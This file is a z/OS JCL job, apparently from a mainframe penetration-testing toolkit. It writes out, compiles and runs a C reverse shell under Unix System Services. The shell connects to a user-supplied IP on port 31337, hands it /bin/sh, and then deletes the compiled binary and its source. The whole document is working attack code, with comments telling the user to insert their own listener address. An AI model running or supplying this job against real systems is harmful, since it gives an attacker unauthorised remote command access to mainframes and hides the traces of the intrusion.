//<USERID>07 JOB (JOB),'Reverse USS C Shell',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
//* Creates a Reverse C shell
//* Change <<YOUR IP>> to your local machine IP address
//CREATECS  EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
//             PATHDISP=(KEEP,DELETE),
//             FILEDATA=TEXT,
//             PATH='/tmp/uss_rev.c'
//SYSUT1    DD DATA,DLM=##
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
 int i , sockfd;
 struct sockaddr_in sin;
 sockfd = socket(AF_INET,SOCK_STREAM,0);
 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr=inet_addr("<<YOUR IP>>");
 sin.sin_port=htons(31337);
 connect(sockfd,(struct sockaddr *)&sin,sizeof(struct sockaddr_in));
 dup2(sockfd,2);
 dup2(sockfd,1);
 dup2(sockfd,0);
 printf("Connecting back to machine\n");
 execl("/bin/sh","sh",NULL);
return EXIT_SUCCESS;
}
##
//OMGLOL    EXEC PGM=BPXBATCH,REGION=800M
//*STDOUT    DD PATH='/tmp/mystd.out',PATHOPTS=(OWRONLY,OCREAT),
//*             PATHMODE=SIRWXU
//*STDERR    DD PATH='/tmp/mystd.err',PATHOPTS=(OWRONLY,OCREAT),
//*             PATHMODE=SIRWXU
//STDPARM   DD *
SH cd /tmp;
cc -o /tmp/rsh3ll /tmp/uss_rev.c;
/tmp/rsh3ll;
rm /tmp/rsh3ll;
rm /tmp/uss_rev.c;
/*
